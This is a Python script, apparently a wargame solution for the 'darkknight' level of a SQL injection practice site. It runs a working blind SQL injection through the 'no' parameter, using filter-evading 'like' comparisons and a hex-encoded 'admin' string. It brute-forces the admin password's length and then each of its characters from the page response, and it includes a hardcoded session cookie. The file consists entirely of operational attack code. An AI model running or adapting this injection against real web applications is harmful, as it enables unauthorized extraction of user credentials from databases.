import requests
import urllib

url="http://los.rubiya.kr/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?no="
session=dict(PHPSESSID="tg6nlvfgcjcmvqdrp1vu3k54o3")

pw=""
length=0

print("[*] START")

print("[*] find password's length")

for i in range(0,30):
	try:
		query=url+"1 or id like 0x61646d696e and length(pw) like "+str(i)+"#"
		r=requests.post(query,cookies=session)
	except:
		print("[*] exception")
		continue

	if "Hello admin" in r.text:
		length=i
		break

print("[*] password's length: ",length)

print("[*] find password")

for j in range(1,length+1):
	for i in range(48,128):
		try:
			# query=url+"1 or id like 0x61646d696e and ord(mid(pw,"+str(j)+",1)) like "+str(i)
			query=url+"1 or id like 0x61646d696e and mid(pw,"+str(j)+",1) like char("+str(i)+")"
			r=requests.post(query,cookies=session)
		except: 
			print("[*] exception")
			continue

		if "Hello admin" in r.text:
			pw+=chr(i)
			print("[*] find : ",pw)
			break

print("[*] password : ",pw)
